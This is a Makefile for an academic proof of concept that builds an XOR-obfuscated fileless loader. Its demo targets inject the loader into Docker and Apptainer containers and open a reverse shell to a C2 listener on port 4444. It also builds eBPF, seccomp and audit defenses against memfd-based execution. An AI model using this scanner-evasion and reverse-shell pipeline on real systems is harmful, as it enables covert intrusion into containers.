# =============================================================================
# Makefile — Fileless Malware Loader PoC
# Research on Methods for Application Containment — Vilnius University MICAC
# =============================================================================
#
# Build Pipeline (automatic, run before any demo):
#   1. Compile inner payload (static ELF — no dynamic linker dependency)
#   2. Compile XOR encoder helper (gen_xor_header)
#   3. XOR-encode payload → src/payload_blob.h  (destroys ELF magic)
#   4. Compile outer loader  (embeds payload_blob.h as a byte array)
#
# ─────────────────────────────────────────────────────
#  DEMO TARGETS  (the three things you actually run)
# ─────────────────────────────────────────────────────
#   make verify           — static scanner gap check (4/4 tools blind)
#   make docker-attack    — fileless reverse shell from inside Docker
#   make apptainer-attack — fileless reverse shell from inside Apptainer
#   make docker-defense   — start eBPF LSM block (memfd->exec)
#   make apptainer-defense — prepare hardened Apptainer run
#
# ─────────────────────────────────────────────────────
#  UTILITY TARGETS
# ─────────────────────────────────────────────────────
#   make build            — compile everything (called automatically)
#   make run              — run loader bare (no shell, for quick smoke test)
#   make strace           — capture syscall evidence to logs/
#   make clean            — remove all build artefacts
#
# WARNING: FOR ACADEMIC/RESEARCH USE ONLY INSIDE AN ISOLATED VM.
# =============================================================================

CC         = gcc
CFLAGS     = -Wall -Wextra -O2
SRCDIR     = src
BINDIR     = bin
# docker0 bridge — how the container reaches the host listener
DOCKER_GW  = 172.17.0.1

# ---------- Binaries ---------------------------------------------------------
PAYLOAD_SRC  = $(SRCDIR)/payload.c
PAYLOAD_ELF  = $(BINDIR)/payload_elf
GEN_SRC      = $(SRCDIR)/gen_xor_header.c
GEN_BIN      = $(BINDIR)/gen_xor_header
PAYLOAD_BLOB = $(SRCDIR)/payload_blob.h
LOADER_SRC   = $(SRCDIR)/loader.c
LOADER_BIN   = $(BINDIR)/loader
STRACE_LOG   = logs/strace_output.txt
BPF_DIR      = bpf
VMLINUX      = $(BPF_DIR)/vmlinux.h
BPF_SRC      = $(BPF_DIR)/memfd_exec_block.bpf.c
BPF_OBJ      = $(BPF_DIR)/memfd_exec_block.bpf.o
BPF_LOADER_SRC = $(BPF_DIR)/memfd_exec_block.c
BPF_LOADER_BIN = $(BINDIR)/memfd_exec_block
CLANG        ?= clang
BPF_CFLAGS   = -O2 -g -Wall -target bpf -D__TARGET_ARCH_x86 -I$(BPF_DIR)
LIBBPF_CFLAGS = $(shell pkg-config --cflags libbpf 2>/dev/null || echo)
LIBBPF_LIBS  = $(shell pkg-config --libs libbpf 2>/dev/null || echo -lbpf)
BPFTOOL      ?= /usr/sbin/bpftool
AUDITCTL     ?= /sbin/auditctl
APPTAINER_DEFENSE_FILE = logs/apptainer_defense.env
APPTAINER_SECCOMP = deployment/seccomp_memfd_exec.json
APPTAINER_DEFENSE_FLAGS = --security seccomp:$(APPTAINER_SECCOMP)
APPTAINER_AUDIT_KEY = apptainer_memfd_exec

# =============================================================================
# DEFAULT
# =============================================================================
.PHONY: all
all: build

# =============================================================================
# BUILD PIPELINE
# =============================================================================
.PHONY: build
build: $(LOADER_BIN)
	@echo ""
	@echo "============================================================"
	@echo " Build COMPLETE"
	@echo "  Loader : $(LOADER_BIN)"
	@echo ""
	@echo " Demo targets:"
	@echo "   make verify           — static scanner gap analysis"
	@echo "   make docker-attack    — fileless reverse shell via Docker"
	@echo "   make apptainer-attack — fileless reverse shell via Apptainer"
	@echo "   make docker-defense   — start eBPF LSM block (memfd->exec)"
	@echo "   make apptainer-defense — prepare hardened Apptainer run"
	@echo "============================================================"

# Step 1: Compile payload as a fully static binary
$(PAYLOAD_ELF): $(PAYLOAD_SRC) | $(BINDIR)
	@echo "[1/4] Compiling payload (static)..."
	$(CC) $(CFLAGS) -static -o $@ $<
	@echo "      Size: $$(du -sh $@ | cut -f1)"

# Step 2: Compile the XOR encoder helper
$(GEN_BIN): $(GEN_SRC) | $(BINDIR)
	@echo "[2/4] Compiling XOR encoder..."
	$(CC) $(CFLAGS) -o $@ $<

# Step 3: XOR-encode the payload ELF → C header (destroys ELF magic signature)
$(PAYLOAD_BLOB): $(PAYLOAD_ELF) $(GEN_BIN)
	@echo "[3/4] XOR-encoding payload → $(PAYLOAD_BLOB)"
	$(GEN_BIN) < $(PAYLOAD_ELF) > $@
	@echo "      First 6 lines of generated header:"
	@head -6 $@

# Step 4: Compile the loader (embeds the XOR blob via #include)
$(LOADER_BIN): $(LOADER_SRC) $(PAYLOAD_BLOB) | $(BINDIR)
	@echo "[4/4] Compiling loader (embedding XOR payload blob)..."
	$(CC) $(CFLAGS) -I$(SRCDIR) -o $@ $<

$(BINDIR):
	mkdir -p $(BINDIR)

logs:
	mkdir -p logs

# =============================================================================
# DEMO 1 — STATIC SCANNER GAP VERIFICATION
# =============================================================================
# Runs the verify_static_gap.sh script against the compiled loader.
# All four static analysis tools (file, strings, xxd checks) should be BLIND
# to the embedded ELF payload.
# Expected output: 4/4 PASS
# =============================================================================
.PHONY: verify
verify: build
	@echo ""
	@echo "============================================================"
	@echo " DEMO 1: Static Scanner Gap Verification"
	@echo " Tests: file, strings, xxd — all should miss the payload"
	@echo "============================================================"
	@bash scripts/verify_static_gap.sh $(LOADER_BIN) $(PAYLOAD_ELF)

# =============================================================================
# DEMO 2 — FILELESS ATTACK VIA DOCKER
# =============================================================================
# Realistic attack model:
#   - Victim image is a STANDARD nginx web app (no loader, no netcat).
#   - The loader is INJECTED into the running container via 'docker cp',
#     simulating an attacker who has exploited an RCE vulnerability.
#   - The reverse shell uses raw socket() syscalls — /bin/sh in alpine
#     is all that is needed. No netcat required.
#
# HOW TO RUN:
#   Terminal 1 — start listener (first):  ncat -lvp 4444
#   Terminal 2 — build + start victim:    make docker-attack
#              — then execute attack:     docker exec victim-webapp /loader
#
# Expected: a /bin/sh prompt in Terminal 1 (ash from alpine)
# Cleanup:  docker stop victim-webapp && docker rm victim-webapp
# =============================================================================
.PHONY: docker-attack
docker-attack:
	@echo ""
	@echo "============================================================"
	@echo " DEMO 2: Fileless Reverse Shell — Docker (Realistic)"
	@echo " Victim  : nginx:alpine web app  (no loader in image)"
	@echo " Attack  : docker cp + docker exec (simulates RCE exploit)"
	@echo " C2      : $(DOCKER_GW):4444"
	@echo "============================================================"
	@echo ""
	@echo "[1/4] Recompiling payload with Docker C2 IP..."
	$(CC) $(CFLAGS) -static \
	    -DC2_IP='"$(DOCKER_GW)"' -DC2_PORT=4444 \
	    -o $(PAYLOAD_ELF) $(PAYLOAD_SRC)
	$(GEN_BIN) < $(PAYLOAD_ELF) > $(PAYLOAD_BLOB)
	$(CC) $(CFLAGS) -I$(SRCDIR) -static -o $(LOADER_BIN) $(LOADER_SRC)
	@echo ""
	@echo "[2/4] Building victim web app image (nginx:alpine, no loader)..."
	docker build -t fileless-poc-victim:latest deployment/ -q
	@echo "[3/4] Starting victim container (nginx web app running on :80)..."
	@docker stop victim-webapp 2>/dev/null || true
	@docker rm   victim-webapp 2>/dev/null || true
	docker run -d --name victim-webapp fileless-poc-victim:latest
	@echo "[4/4] Dropping loader into running container (simulating RCE file-drop)..."
	docker cp $(LOADER_BIN) victim-webapp:/loader
	docker exec victim-webapp chmod +x /loader
	@echo ""
	@echo "============================================================"
	@echo " Victim container 'victim-webapp' is running (nginx on :80)"
	@echo " Loader injected at /loader inside the container"
	@echo ""
	@echo " NOW run these in TWO separate terminals:"
	@echo ""
	@echo "   TERMINAL 1 (listener):  ncat -lvp 4444"
	@echo "   TERMINAL 2 (attack):    docker exec -i victim-webapp /loader"
	@echo ""
	@echo "   Cleanup when done:      docker stop victim-webapp"
	@echo "============================================================"

# =============================================================================
# DEMO 3 — FILELESS ATTACK VIA APPTAINER
# =============================================================================
# Realistic attack model:
#   - Victim image is a STANDARD Python research workload (.sif, immutable).
#   - The loader is dropped to the HOST /tmp directory, which Apptainer
#     bind-mounts into the container by default — making it visible inside
#     without being part of the .sif image.
#   - The reverse shell uses 127.0.0.1 because Apptainer shares the host
#     network namespace.
#
# HOW TO RUN:
#   Terminal 1 — start listener (first):  ncat -lvp 4444
#   Terminal 2 — build + prepare:         make apptainer-attack
#              — then execute attack:      apptainer exec apptainer-victim.sif /tmp/loader
#
# Expected: /bin/sh prompt in Terminal 1; /proc maps show /memfd: (deleted)
# =============================================================================
.PHONY: apptainer-attack
apptainer-attack:
	@echo ""
	@echo "============================================================"
	@echo " DEMO 3: Fileless Reverse Shell — Apptainer (Realistic)"
	@echo " Victim  : nginx:alpine web app (.sif, no loader inside)"
	@echo " Attack  : /tmp bind-mount vector (simulates host FS access)"
	@echo " C2      : 127.0.0.1:4444 (shared host network NS)"
	@echo "============================================================"
	@echo ""
	@command -v apptainer >/dev/null 2>&1 || \
	    { echo "  ERROR: 'apptainer' not found."; exit 1; }
	@echo "[1/3] Recompiling payload with loopback C2 IP..."
	$(CC) $(CFLAGS) -static \
	    -DC2_IP='"127.0.0.1"' -DC2_PORT=4444 \
	    -o $(PAYLOAD_ELF) $(PAYLOAD_SRC)
	$(GEN_BIN) < $(PAYLOAD_ELF) > $(PAYLOAD_BLOB)
	$(CC) $(CFLAGS) -I$(SRCDIR) -static -o $(LOADER_BIN) $(LOADER_SRC)
	@echo ""
	@echo "[2/3] Building victim web app image (--fakeroot)..."
	if [ ! -f deployment/apptainer-victim.sif ]; then \
	    apptainer build --fakeroot --force deployment/apptainer-victim.sif deployment/container.def; \
	fi
	@echo "[3/3] Dropping loader to host /tmp (bind-mount attack vector)..."
	cp $(LOADER_BIN) /tmp/loader
	chmod +x /tmp/loader
	@echo ""
	@if [ -f $(APPTAINER_DEFENSE_FILE) ]; then \
	    FLAGS=$$(cat $(APPTAINER_DEFENSE_FILE)); \
	    echo "============================================================"; \
	    echo " Defense mode enabled for Apptainer."; \
	    echo " Running hardened exec now..."; \
	    echo "   apptainer exec $$FLAGS deployment/apptainer-victim.sif /tmp/loader"; \
	    echo "============================================================"; \
	    apptainer exec $$FLAGS deployment/apptainer-victim.sif /tmp/loader; \
	  else \
	    echo "============================================================"; \
	    echo " Victim SIF  : deployment/apptainer-victim.sif (nginx:alpine web app)"; \
	    echo " Loader      : /tmp/loader (visible inside container via bind-mount)"; \
	    echo ""; \
	    echo " NOW run these in TWO separate terminals:"; \
	    echo ""; \
	    echo "   TERMINAL 1 (listener):  ncat -lvp 4444"; \
	    echo "   TERMINAL 2 (attack):    apptainer exec deployment/apptainer-victim.sif /tmp/loader"; \
	    echo "============================================================"; \
	  fi

# =============================================================================
# DEFENSE 1 — DOCKER eBPF MONITOR (bpftrace)
# =============================================================================
# Runs a bpftrace program that detects memfd_create -> execve/fexecve
# within a short time window and kills the exec attempt.
# Expected: exec is blocked and logged to logs/defense_docker_bpftrace.log
# =============================================================================
.PHONY: docker-defense
docker-defense: bpf-build
	@echo ""
	@echo "============================================================"
	@echo " DEFENSE 1: Docker eBPF LSM Block (memfd -> exec)"
	@echo " Loader  : $(BPF_LOADER_BIN)"
	@echo ""
	@echo " NOTE: Run this in a dedicated terminal; press Ctrl+C to stop."
	@echo "============================================================"
	@sudo $(BPF_LOADER_BIN) $(BPF_OBJ)

# =============================================================================
# BPF BUILD — LSM + TRACEPOINT
# =============================================================================
.PHONY: bpf-build
bpf-build: $(BPF_OBJ) $(BPF_LOADER_BIN)
	@echo "[BPF] Build complete"

$(VMLINUX):
	@if [ -x "$(BPFTOOL)" ]; then \
	    BPFTOOL_BIN="$(BPFTOOL)"; \
	  elif command -v bpftool >/dev/null 2>&1; then \
	    BPFTOOL_BIN=$$(command -v bpftool); \
	  else \
	    echo "  ERROR: 'bpftool' not found."; exit 1; \
	  fi; \
	  echo "[BPF] Using bpftool: $$BPFTOOL_BIN"; \
	  $$BPFTOOL_BIN btf dump file /sys/kernel/btf/vmlinux format c > $(VMLINUX)

$(BPF_OBJ): $(BPF_SRC) $(VMLINUX)
	@echo "[BPF] Compiling BPF program..."
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

$(BPF_LOADER_BIN): $(BPF_LOADER_SRC) | $(BINDIR)
	@echo "[BPF] Compiling loader..."
	$(CC) $(CFLAGS) $(LIBBPF_CFLAGS) -o $@ $< $(LIBBPF_LIBS)

# =============================================================================
# DEFENSE 2 — APPTAINER NATIVE HARDENING
# =============================================================================
# Prepares the hardened Apptainer environment and prints the hardened exec.
# Expected: reverse shell is blocked due to --network none.
# =============================================================================
.PHONY: apptainer-defense
apptainer-defense:
	@echo ""
	@echo "============================================================"
	@echo " DEFENSE 2: Apptainer Seccomp Policy"
	@echo "============================================================"
	@command -v apptainer >/dev/null 2>&1 || \
	    { echo "  ERROR: 'apptainer' not found."; exit 1; }
	@echo "[1/2] Recompiling payload with loopback C2 IP..."
	$(CC) $(CFLAGS) -static \
	    -DC2_IP='"127.0.0.1"' -DC2_PORT=4444 \
	    -o $(PAYLOAD_ELF) $(PAYLOAD_SRC)
	$(GEN_BIN) < $(PAYLOAD_ELF) > $(PAYLOAD_BLOB)
	$(CC) $(CFLAGS) -I$(SRCDIR) -static -o $(LOADER_BIN) $(LOADER_SRC)
	@echo ""
	@echo "[2/3] Dropping loader to host /tmp (bind-mount attack vector)..."
	cp $(LOADER_BIN) /tmp/loader
	chmod +x /tmp/loader
	@echo "[3/3] Ensuring victim image exists (--fakeroot if missing)..."
	@if [ ! -f deployment/apptainer-victim.sif ]; then \
	    echo ""; \
	    echo "Building victim image (--fakeroot)..."; \
	    apptainer build --fakeroot --force deployment/apptainer-victim.sif deployment/container.def; \
	fi
	@echo ""
	@if [ ! -f $(APPTAINER_SECCOMP) ]; then \
	    echo "  ERROR: seccomp profile not found: $(APPTAINER_SECCOMP)"; \
	    exit 1; \
	fi
	@echo "$(APPTAINER_DEFENSE_FLAGS)" > $(APPTAINER_DEFENSE_FILE)
	@echo "============================================================"
	@echo " Defense flags saved (seccomp memfd+execveat deny + seccomp log)."
	@echo " Next: run: make apptainer-attack"
	@echo "============================================================"

# =============================================================================
# DEFENSE 2 (LOGGING) — AUDIT RULES FOR FILELESS PATH
# =============================================================================
# Adds audit rules for memfd_create and execveat to produce evidence logs.
# Use 'make apptainer-defense-log-stop' to remove rules.
# =============================================================================
.PHONY: apptainer-defense-log
apptainer-defense-log:
	@echo ""
	@echo "============================================================"
	@echo " DEFENSE 2 LOGGING: Audit rules (memfd_create, execveat)"
	@echo "============================================================"
	@if [ -x "$(AUDITCTL)" ]; then \
	    AUDITCTL_BIN="$(AUDITCTL)"; \
	  elif command -v auditctl >/dev/null 2>&1; then \
	    AUDITCTL_BIN=$$(command -v auditctl); \
	  else \
	    echo "  ERROR: 'auditctl' not found."; exit 1; \
	  fi; \
	  echo "[AUDIT] Using auditctl: $$AUDITCTL_BIN"; \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b64 -S memfd_create -F exe=/tmp/loader -k $(APPTAINER_AUDIT_KEY); \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b64 -S execveat -F exe=/tmp/loader -k $(APPTAINER_AUDIT_KEY); \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b32 -S memfd_create -F exe=/tmp/loader -k $(APPTAINER_AUDIT_KEY) 2>/dev/null || true; \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b32 -S execveat -F exe=/tmp/loader -k $(APPTAINER_AUDIT_KEY) 2>/dev/null || true; \
	  sudo $$AUDITCTL_BIN -l | grep $(APPTAINER_AUDIT_KEY) || true

.PHONY: apptainer-defense-log-wide
apptainer-defense-log-wide:
	@echo ""
	@echo "============================================================"
	@echo " DEFENSE 2 LOGGING (WIDE): Audit rules without exe filter"
	@echo "============================================================"
	@if [ -x "$(AUDITCTL)" ]; then \
	    AUDITCTL_BIN="$(AUDITCTL)"; \
	  elif command -v auditctl >/dev/null 2>&1; then \
	    AUDITCTL_BIN=$$(command -v auditctl); \
	  else \
	    echo "  ERROR: 'auditctl' not found."; exit 1; \
	  fi; \
	  echo "[AUDIT] Using auditctl: $$AUDITCTL_BIN"; \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b64 -S memfd_create -k $(APPTAINER_AUDIT_KEY); \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b64 -S execveat -k $(APPTAINER_AUDIT_KEY); \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b32 -S memfd_create -k $(APPTAINER_AUDIT_KEY) 2>/dev/null || true; \
	  sudo $$AUDITCTL_BIN -a always,exit -F arch=b32 -S execveat -k $(APPTAINER_AUDIT_KEY) 2>/dev/null || true; \
	  sudo $$AUDITCTL_BIN -l | grep $(APPTAINER_AUDIT_KEY) || true

.PHONY: apptainer-defense-log-stop
apptainer-defense-log-stop:
	@echo ""
	@echo "============================================================"
	@echo " DEFENSE 2 LOGGING: Remove audit rules"
	@echo "============================================================"
	@if [ -x "$(AUDITCTL)" ]; then \
	    AUDITCTL_BIN="$(AUDITCTL)"; \
	  elif command -v auditctl >/dev/null 2>&1; then \
	    AUDITCTL_BIN=$$(command -v auditctl); \
	  else \
	    echo "  ERROR: 'auditctl' not found."; exit 1; \
	  fi; \
	  sudo $$AUDITCTL_BIN -D -k $(APPTAINER_AUDIT_KEY); \
	  sudo $$AUDITCTL_BIN -l | grep $(APPTAINER_AUDIT_KEY) || true

# =============================================================================
# UTILITY — Quick smoke-test run (no shell, checks loader stages print OK)
# =============================================================================
.PHONY: run
run: build
	@echo ""
	@echo ">>> Running loader — payload executes in-memory (no reverse shell) <<<"
	$(LOADER_BIN)

# =============================================================================
# UTILITY — strace syscall capture
# =============================================================================
.PHONY: strace
strace: build logs
	@echo ""
	@echo ">>> Running loader under strace — log: $(STRACE_LOG) <<<"
	strace -f \
	       -e trace=memfd_create,write,execve,execveat,openat,read,mmap,socket,connect,dup2 \
	       -o $(STRACE_LOG) \
	       $(LOADER_BIN)
	@echo ""
	@echo "=== Key syscalls detected ==="
	@grep -E "(memfd_create|execveat|socket|connect|dup2)" $(STRACE_LOG) || true
	@echo "=============================="
	@echo "Full log: $(STRACE_LOG)"

# =============================================================================
# CLEAN
# =============================================================================
.PHONY: clean
clean:
	rm -rf $(BINDIR) $(PAYLOAD_BLOB) logs apptainer-sandbox
	rm -f $(BPF_OBJ) $(BPF_LOADER_BIN) $(VMLINUX)
	rm -f deployment/apptainer-victim.sif /tmp/loader
	-docker stop victim-webapp 2>/dev/null || true
	-docker rm   victim-webapp 2>/dev/null || true
	-docker rmi  fileless-poc-victim:latest 2>/dev/null || true
	@echo "Cleaned."

